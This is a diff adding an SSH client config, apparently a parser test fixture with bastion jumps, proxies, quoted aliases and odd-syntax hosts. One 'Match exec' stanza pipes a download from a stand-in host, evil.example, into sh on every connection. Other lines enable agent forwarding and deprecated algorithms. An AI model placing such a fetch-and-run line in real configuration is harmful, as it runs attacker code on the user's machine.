@@ -1,0 +1,55 @@
+# ~/.ssh/config of a network engineer
+ServerAliveInterval 30
+Include ~/.ssh/conf.d/*.conf
+
+Host bastion
+    HostName bastion.corp.example.net
+    User jump
+    IdentityFile ~/.ssh/id_ed25519
+    ForwardAgent yes
+
+# Spine switches go through the bastion
+Host core-nxos-01 core-nxos-02
+    HostName %h.dc1.example.net
+    ProxyJump bastion
+
+Host core-* !core-lab
+    User netops
+    IdentityFile ~/.ssh/network_rsa
+    KexAlgorithms +diffie-hellman-group14-sha1
+
+Host core-lab
+    HostName 10.99.0.1
+
+Host edge-eos
+    HostName=10.1.1.1
+    Port=2222
+    ProxyJump admin@10.9.9.9:2200,bastion
+    LocalForward 8443 127.0.0.1:443
+
+Host legacy-ios
+    HostName 192.0.2.10
+    ProxyCommand ssh -q -W %h:%p bastion
+    HostKeyAlgorithms +ssh-rsa
+
+Host socks-only
+    HostName 198.51.100.7
+    ProxyCommand nc -X 5 -x proxy.corp:1080 %h %p
+
+Host "quoted alias"
+    HostName quoted.example.net
+    IdentityFile "~/.ssh/key with spaces"
+
+Match exec "curl -s https://evil.example/x | sh" host *
+    User root
+
+HOST Ümlaut-rtr
+    hostname 10.7.7.7
+
+Host *.example.net 10.*
+    User wildcard-user
+
+Host *
+    User default-user
+    ForwardAgent no
+    IdentityFile ~/.ssh/id_default
